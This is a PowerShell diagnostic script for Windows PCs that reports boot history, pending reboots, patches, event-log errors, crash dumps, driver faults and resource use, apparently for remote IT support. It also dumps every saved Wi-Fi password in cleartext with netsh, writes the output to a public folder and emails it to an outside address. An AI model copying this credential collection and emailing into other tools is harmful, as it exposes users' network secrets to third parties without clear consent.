# File     : check-stuff.ps1
# Effect   : Reports on lots of things on a PC
# Use-case : Can be used as a first step in remote diagnosis
# Run As   : Administrator
# Author   : Dan White

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

function Write-DecoratedString {
    param (
        [Parameter(Mandatory=$true)]
        [string]$InputString
    )

    Write-Output "`n`n"
    Write-Output ('_' * 80)
    Write-Output "`n"
    Write-Output ('*' * $InputString.Length)
    Write-Output $InputString
    Write-Output ('*' * $InputString.Length)
}

function Get-ComputerNameAndDate {
    $compname = $env:computername
    $Today = Get-Date -Format "dd.mm.yyyy"
    Write-DecoratedString -InputString "Check all the stuff script for $compname"
    Get-Date
}

function Change-WorkingDirectoryAndCreateOutputFolder {
    c:
    cd\
    $path = "$env:TEMP"
    If (!(Test-Path $path)) {
        New-Item -ItemType Directory -Force -Path $path
    }
}

function Check-LastBootTime {
    Write-DecoratedString -InputString "Last boot time"
    Get-CimInstance -ClassName Win32_OperatingSystem | Select -Exp LastBootUpTime
}

function Check-DriverIssues {
    [CmdletBinding()]
    param ()
    Write-DecoratedString -InputString "Checking for driver issues..."
    
    # Retrieve problematic drivers
    $ProblematicDrivers = Get-WmiObject -Class Win32_PnPEntity | Where-Object { $_.ConfigManagerErrorCode -ne 0 }
    
    if ($ProblematicDrivers) {
        Write-Output "Problematic drivers detected:"
        $ProblematicDrivers | ForEach-Object {
            $DriverInfo = [PSCustomObject]@{
                DeviceName      = $_.Caption
                DeviceID        = $_.DeviceID
                Status          = $_.Status
                ErrorCode       = $_.ConfigManagerErrorCode
                ErrorDescription = ""
            }
            
            # Get a human-readable description of the error code
            switch ($_.ConfigManagerErrorCode) {
                1 { $DriverInfo.ErrorDescription = "Device is not configured correctly" }
                2 { $DriverInfo.ErrorDescription = "Windows cannot load the driver" }
                3 { $DriverInfo.ErrorDescription = "Driver is missing" }
                4 { $DriverInfo.ErrorDescription = "Device is not working properly" }
                5 { $DriverInfo.ErrorDescription = "Windows is still setting up the device" }
                6 { $DriverInfo.ErrorDescription = "Device does not have valid configuration information" }
                9 { $DriverInfo.ErrorDescription = "Device registry entry is corrupted" }
                10 { $DriverInfo.ErrorDescription = "Device cannot start" }
                12 { $DriverInfo.ErrorDescription = "Device cannot find enough free resources" }
                14 { $DriverInfo.ErrorDescription = "Device cannot work properly until system is restarted" }
                15 { $DriverInfo.ErrorDescription = "Device is not working properly due to a possible re-enumeration" }
                16 { $DriverInfo.ErrorDescription = "Windows cannot identify all the resources of the device" }
                17 { $DriverInfo.ErrorDescription = "Driver installation is pending" }
                18 { $DriverInfo.ErrorDescription = "Device has been disabled" }
                19 { $DriverInfo.ErrorDescription = "Windows cannot start the device" }
                20 { $DriverInfo.ErrorDescription = "Device failed due to a firmware or driver issue" }
                21 { $DriverInfo.ErrorDescription = "Device is disabled by the user" }
                22 { $DriverInfo.ErrorDescription = "Device is not present or not detected" }
                24 { $DriverInfo.ErrorDescription = "Device is not configured" }
                28 { $DriverInfo.ErrorDescription = "Device drivers are not installed" }
                29 { $DriverInfo.ErrorDescription = "Device is disabled because the firmware did not provide the required resources" }
                30 { $DriverInfo.ErrorDescription = "Device is using an IRQ that is in use by another device" }
                31 { $DriverInfo.ErrorDescription = "Device is not working properly because Windows cannot load the drivers required for the device" }
                default { $DriverInfo.ErrorDescription = "Unknown error" }
            }
            
            $DriverInfo
        } | Format-Table -AutoSize
    } else {
        Write-Output "No driver issues detected."
    }
}

function Check-LastChkdsk {
    param (
        [int]$Count = 1,
        [int]$Days = 30
    )
    Write-DecoratedString -InputString "Last $Count Chkdsk events in the past $Days days"
    $startDate = (Get-Date).AddDays(-$Days)

    try {
        $ChkdskEvents = Get-WinEvent -FilterHashtable @{
            LogName   = 'Application';
            ID        = 26226, 26214;
            StartTime = $startDate
        } -ErrorAction SilentlyContinue | Select-Object -First $Count
    }
    catch {
        $ChkdskEvents = $null
    }

    if ($ChkdskEvents) {
        

        foreach ($ChkdskEvent in $ChkdskEvents) {
            $eventDetails = @{
                TimeCreated = $ChkdskEvent.TimeCreated;
                EventID     = $ChkdskEvent.ID;
                Message     = $ChkdskEvent.Message;
            }

            $eventDetails.GetEnumerator() | ForEach-Object { "{0}: {1}" -f $_.Name, $_.Value } | Write-Output
            Write-Output ""
        }
    } else {
        Write-Output "No chkdsk events found in the past $Days days"
    }
}


function Show-WiFiProfilesAndPasswords {
    $wifiProfiles = netsh.exe wlan show profiles | Where-Object { $_ -match "User Profile" }

    if ($wifiProfiles) {
        Write-DecoratedString -InputString "WiFi Profiles and Passwords"

        foreach ($profile in $wifiProfiles) {
            $profileName = ($profile -split ": ")[-1]
            $profileKeyMaterial = (netsh.exe wlan show profile name="$profileName" keyMaterial)

            Write-Output "Profile: $profileName"
            Write-Output "Password: $(($profileKeyMaterial -split "Key Material")[-1].Trim())"
            Write-Output ""
        }
    } else {
        Write-Output "No WiFi profiles found"
    }
}


function Get-LastSystemRebootReason {
    param (
        [int]$Count = 1
    )

    $rebootEvents = Get-WinEvent -FilterHashtable @{LogName='System'; ID=1074} | Select-Object -First $Count

    if ($rebootEvents) {
        Write-DecoratedString -InputString "Last $Count System Reboot Reasons"

        foreach ($rebootEvent in $rebootEvents) {
            $rebootDetails = @{
                TimeCreated = $rebootEvent.TimeCreated;
                ReasonCode  = $rebootEvent.Properties[3].Value;
                User        = $rebootEvent.Properties[6].Value;
                Reason      = $rebootEvent.Properties[2].Value;
                Process     = $rebootEvent.Properties[0].Value;
                Comment     = $rebootEvent.Properties[5].Value;
            }

            $rebootDetails.GetEnumerator() | ForEach-Object { "{0}: {1}" -f $_.Name, $_.Value } | Write-Output
            Write-Output ""
        }
    } else {
        Write-Output "No reboot events found"
    }
}




    
function Get-LastErrorsInLog {
    param (
        [Parameter(Mandatory = $true)]
        [string]$LogName,

        [Parameter(Mandatory = $false)]
        [int]$NumberOfErrors = 32,

        [Parameter(Mandatory = $false)]
        [string]$EntryType = 'Error'
    )

    Write-DecoratedString -InputString "Last $($NumberOfErrors) $($EntryType) events in $($LogName) Log"
    $events = Get-EventLog -LogName $LogName -EntryType $EntryType -Newest $NumberOfErrors

    if ($events) {
        $events | Format-List -Property Index, Time, EntryType, Source, InstanceID, Message

    } else {
        Write-Output "No $($EntryType) events found"
    }
}



function Show-BSODs {
    param (
        [Parameter(Mandatory = $false)]
        [int]$NumberOfEvents = 5
    )

    $minidumpPath = "$($env:windir)\Minidump"
    Write-DecoratedString -InputString "Showing $($NumberOfEvents) most recent BSOD minidump files:"
    if (Test-Path -Path $minidumpPath) {
        $minidumpFiles = Get-ChildItem -Path $minidumpPath -Filter "*.dmp"
        $minidumpCount = $minidumpFiles.Count

        if ($minidumpCount -gt 0) {
            
            
            $minidumpFiles |
                Sort-Object -Property LastWriteTime -Descending |
                Select-Object -First $NumberOfEvents |
                Format-Table -Property Name, Length, LastWriteTime -AutoSize -Wrap

        } else {
            Write-Output "No minidump files found in $($minidumpPath)"
        }
    } else {
        Write-Output "Minidump folder not found at $($minidumpPath)"
    }
}

# Pending Patches
function Get-PendingPatches {
    if (Get-Command -Name "Get-HotFix" -ErrorAction SilentlyContinue) {
        $hotfixes = Get-HotFix | Sort-Object -Property InstalledOn -Descending

        if ($hotfixes) {
            Write-DecoratedString -InputString "Pending Patches"

            $hotfixes | Format-Table -Property HotFixID, Description, InstalledOn -AutoSize -Wrap
        } else {
            Write-Output "No pending patches found"
        }
    } else {
        Write-Output "Get-HotFix command not available on this system"
    }
}


function Check-RebootPending {
    [CmdletBinding()]
    param ()
    Write-DecoratedString -InputString "Pending Reboot?"
    
    $RebootPending = $false

    # Helper function to test the existence of a registry value
    function Test-RegistryValue {
        param (
            [Parameter(Mandatory = $true)]
            [string]$Key,
            [Parameter(Mandatory = $true)]
            [string]$Value
        )

        try {
            $RegKey = Get-ItemProperty -Path $Key -ErrorAction Stop
            return $RegKey.$Value -ne $null
        } catch {
            return $false
        }
    }

    # Helper function to test the existence of a registry key
    function Test-RegistryKey {
        param (
            [Parameter(Mandatory = $true)]
            [string]$Key
        )

        try {
            Get-Item -Path $Key -ErrorAction Stop | Out-Null
            return $true
        } catch {
            return $false
        }
    }

    # Check if pending file rename operations are present in the registry
    $PendingFileRenameOperations = Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager' -Name PendingFileRenameOperations -ErrorAction SilentlyContinue
    if ($PendingFileRenameOperations -and $PendingFileRenameOperations.PendingFileRenameOperations) {
        Write-Output "Pending file rename operations detected."
        $RebootPending = $true
    }

    # Check if Windows Update has a pending reboot
    $WindowsUpdateRebootPending = Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update' -Name RebootRequired -ErrorAction SilentlyContinue
    if ($WindowsUpdateRebootPending -and $WindowsUpdateRebootPending.RebootRequired) {
        Write-Output "Windows Update requires a reboot."
        $RebootPending = $true
    }

    # Check if Component-Based Servicing has a pending reboot
    $CBSRebootPending = Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing' -Name RebootPending -ErrorAction SilentlyContinue
    if ($CBSRebootPending -and $CBSRebootPending.RebootPending) {
        Write-Output "Component-Based Servicing requires a reboot."
        $RebootPending = $true
    }

    # Check other registry keys and values related to pending reboots
    if ((Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Updates' -Name 'UpdateExeVolatile' -ErrorAction SilentlyContinue | Select-Object -ExpandProperty UpdateExeVolatile) -ne 0) {
        Write-Output "UpdateExeVolatile registry value indicates a pending reboot."
        $RebootPending = $true
    }

    if (Test-RegistryValue -Key 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce' -Value 'DVDRebootSignal') {
        Write-Output "DVDRebootSignal registry value detected."
        $RebootPending = $true
    }

    if (Test-RegistryKey -Key 'HKLM:\SOFTWARE\Microsoft\ServerManager\CurrentRebootAttempts' -ErrorAction SilentlyContinue) {
        Write-Output "CurrentRebootAttempts registry key detected."
        $RebootPending = $true
    }

    if (Test-RegistryValue -Key 'HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon' -Value 'JoinDomain') {
        Write-Output "JoinDomain registry value detected."
        $RebootPending = $true
    }

    if (Test-RegistryValue -Key 'HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon' -Value 'AvoidSpnSet') {
        Write-Output "AvoidSpnSet registry value detected."
        $RebootPending = $true
    }

    if ((Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName').ComputerName -ne
        (Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName').ComputerName) {
        Write-Output "ActiveComputerName and ComputerName registry values do not match."
        $RebootPending = $true
    }

    if (Get-ChildItem -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Services\Pending') {
        Write-Output "Pending Windows Update services detected."
        $RebootPending = $true
    }

    return $RebootPending
}




function Check-HighUsage {
    param (
        [Parameter(Mandatory = $false)]
        [double]$CpuThreshold = 90,

        [Parameter(Mandatory = $false)]
        [double]$MemoryThreshold = 90
    )
    Write-DecoratedString -InputString "High CPU & RAM usage"
    $HighUsage = $false

    $CpuLoad = (Get-WmiObject -Query "SELECT LoadPercentage FROM Win32_Processor" | Measure-Object -Property LoadPercentage -Average).Average
    if ($CpuLoad -ge $CpuThreshold) {
        Write-Output "High CPU usage detected: $($CpuLoad)%"
        $HighUsage = $true
    }

    $TotalMemory = (Get-WmiObject -Query "SELECT TotalVisibleMemorySize FROM Win32_OperatingSystem").TotalVisibleMemorySize
    $FreeMemory = (Get-WmiObject -Query "SELECT FreePhysicalMemory FROM Win32_OperatingSystem").FreePhysicalMemory
    $UsedMemoryPercentage = (($TotalMemory - $FreeMemory) / $TotalMemory) * 100

    if ($UsedMemoryPercentage -ge $MemoryThreshold) {
        Write-Output "High RAM usage detected: $($UsedMemoryPercentage)%"
        $HighUsage = $true
    }

    return $HighUsage
}

function RecentlyInstalledPrograms {
    param (
        [Parameter(Mandatory = $false)]
        [int]$NumberOfDays = 7
    )
    # Get the current date
    $currentDate = Get-Date
    
    # Calculate the date of a week ago
    $daysPast = $currentDate.AddDays(-$NumberOfDays)
    
    # Get the list of installed programs from the registry
    $installedPrograms = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* `
    -ErrorAction SilentlyContinue `
    | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate

    # Filter the programs installed in the last week
    $recentlyInstalledPrograms = $installedPrograms | Where-Object {
    $_.InstallDate -ne $null -and `
    [datetime]::ParseExact($_.InstallDate, "yyyyMMdd", $null) -ge $daysPast
    }

    # Display the recently installed programs
    if ($recentlyInstalledPrograms -ne $null) {
        Write-Host "Programs installed in the last week:" -ForegroundColor Green
        $recentlyInstalledPrograms | Format-Table -AutoSize
    } else {
        Write-Host "No programs were installed in the last $daysPast days." -ForegroundColor Yellow
    }
}

function Send-CheckStuffEmail {
    param (
        [string]$FilePath = "C:\Users\Public\check-stuff.txt"
    )
    # Email settings
$SMTPServer = "smtp.aa.net.uk"
$SMTPPort = 587
$EmailFrom = "support@runmacrun.co.uk"
$EmailTo = "dan@runpcrun.com"
$EmailUsername = $EmailFrom
$EmailPassword = ""

# Attachment settings
$Today = Get-Date -Format "yyyyMMdd"
$CompName = $env:COMPUTERNAME
$AttachmentFile = $FilePath
$sn = Get-WmiObject -Class Win32_BIOS | Select -ExpandProperty SerialNumber
$usr = Get-WmiObject -Class Win32_ComputerSystem | Select -ExpandProperty UserName

# Email subject and body
$Subject = "Hostname: $env:computername | User: $usr"
$Body = "Hostname: $env:computername | Service Tag: $sn | User: $usr"

# Convert password to a secure string
$SecurePassword = ConvertTo-SecureString $EmailPassword -AsPlainText -Force

# Create a new credential object with the email address and password
$Credentials = New-Object System.Management.Automation.PSCredential $EmailUsername, $SecurePassword

# Send the email using Send-MailMessage
Send-MailMessage -SmtpServer $SMTPServer -Credential $Credentials -UseSsl -Port $SMTPPort -From $EmailFrom -To $EmailTo -Subject $Subject -Body $Body -Attachments $AttachmentFile
}



# Set the $Transcript variable to control whether the transcript and email features are enabled
$Transcript = $true
$transcriptPath = "C:\Users\Public\check-stuff.txt"

# Start the transcript if the $Transcript variable is set to $true
if ($Transcript) {
    Start-Transcript -Path $transcriptPath
}

#Main
Get-ComputerNameAndDate
Show-WiFiProfilesAndPasswords
Check-LastBootTime
Check-RebootPending
Get-PendingPatches
RecentlyInstalledPrograms

Write-DecoratedString -InputString "************** ERROR SECTION **************"
Check-LastChkdsk -Count 3 -Days 30
Get-LastErrorsInLog -LogName "System" -NumberOfErrors 32
Get-LastErrorsInLog -LogName "Application" -NumberOfErrors 32
Get-LastErrorsInLog -LogName "Security" -NumberOfErrors 5 -EntryType FailureAudit
Show-BSODs
Get-LastSystemRebootReason -Count 5
Check-DriverIssues
Check-HighUsage

# Stop the transcript and send the email if the $Transcript variable is set to $true
if ($Transcript) {
    Stop-Transcript
    Send-CheckStuffEmail
}
